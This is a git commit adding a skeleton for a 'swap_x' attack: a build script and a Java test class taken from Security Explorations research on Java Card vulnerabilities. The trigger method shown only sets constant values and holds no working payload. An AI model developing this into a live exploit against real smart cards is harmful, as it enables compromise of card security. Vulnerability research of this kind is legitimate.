691c0a4804ee447d219334ccce982265b9d1a3a7
quapka <quapka@gmail.com>
2020-06-24 12:41:12 +0200

    Add swap_x attack skeleton

---
+++ jsec/data/attacks/swap_x/build.bat
@@ -0,0 +1,7 @@
+@echo off
+
+set poc=swap_x
+set genidx=4
+set genarg=0
+ 
+call ..\build.bat %poc% %genidx% %genarg%
---
+++ jsec/data/attacks/swap_x/src/Test.java
@@ -0,0 +1,42 @@
+/*## (c) SECURITY EXPLORATIONS    2019 poland                                #*/
+/*##     http://www.security-explorations.com                                #*/
+
+/* RESEARCH MATERIAL:	SE-2019-01                                            */
+/* Security vulnerabilities in Java Card                                      */
+
+/* THIS SOFTWARE IS PROTECTED BY DOMESTIC AND INTERNATIONAL COPYRIGHT LAWS    */
+/* UNAUTHORISED COPYING OF THIS SOFTWARE IN EITHER SOURCE OR BINARY FORM IS   */
+/* EXPRESSLY FORBIDDEN. ANY USE, INCLUDING THE REPRODUCTION, MODIFICATION,    */
+/* DISTRIBUTION, TRANSMISSION, RE-PUBLICATION, STORAGE OR DISPLAY OF ANY      */
+/* PART OF THE SOFTWARE, FOR COMMERCIAL OR ANY OTHER PURPOSES REQUIRES A      */
+/* VALID LICENSE FROM THE COPYRIGHT HOLDER.                                   */
+
+/* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS    */
+/* OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,*/
+/* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL    */
+/* SECURITY EXPLORATIONS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, */
+/* WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF  */
+/* OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE     */
+/* SOFTWARE.                                                                  */
+
+package com.se.vulns;
+
+public class Test {
+ public static void trigger_swapx() {
+  short a1=(short)0x0101;
+  short a2=(short)0x0202;
+  short a3=(short)0x0303;
+  short a4=(short)0x0404;
+  short a5=(short)0x0505;
+  short a6=(short)0x0606;
+  short a7=(short)0x0707;
+  short a8=(short)0x0808;
+  short a9=(short)0x0909;
+  short a10=(short)0x0a0a;
+  short a11=(short)0x0a0a;
+  short a12=(short)0x0a0a;
+  short a13=(short)0x0a0a;
+  short a14=(short)0x0a0a;
+  short a15=(short)0x0a0a;
+ }
+}
